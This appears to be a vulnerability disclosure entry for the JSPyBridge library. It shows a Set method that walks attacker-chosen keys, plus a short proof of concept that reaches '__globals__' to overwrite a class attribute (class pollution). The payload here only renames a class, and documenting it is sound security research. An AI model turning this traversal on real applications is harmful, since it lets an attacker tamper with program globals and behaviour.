## JSPyBridge

### Meta

+ Library: JSPyBridge
+ Stars: 718
+ Version: 1.2.1
+ CVE: N/A
+ Status: Pending
+ Payload: ```PyInterface.Set("", 0, ['python','__globals__','PyInterface'], ('__name__', 'polluted'))```
+ Foundby: redacted
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/extremeheat/JSPyBridge

### Vulnerable Code Snippet

```python
def Set(self, r, ffid, keys, args):
    v = self.m[ffid]
    on, val = args
    for key in keys:
        if type(v) in (dict, tuple, list):
            v = v[key]
        elif hasattr(v, str(key)):
            v = getattr(v, str(key))
        else:
            try:
                v = v[key]
            except:
                raise LookupError(f"Property '{fix_key(key)}' does not exist on {repr(v)}")
    if type(v) in (dict, tuple, list, set):
        v[on] = val
    else:
        setattr(v, on, val)
    self.q(r, "void", self.cur_ffid)
```
### PoC

```python
from javascript.pyi import PyInterface
from javascript import config, events

interface = PyInterface(events.EventLoop(), config.executor)

interface.Set("", 0, ['python','__globals__','PyInterface'], ('__name__', 'polluted'))
print(PyInterface.__name__)
```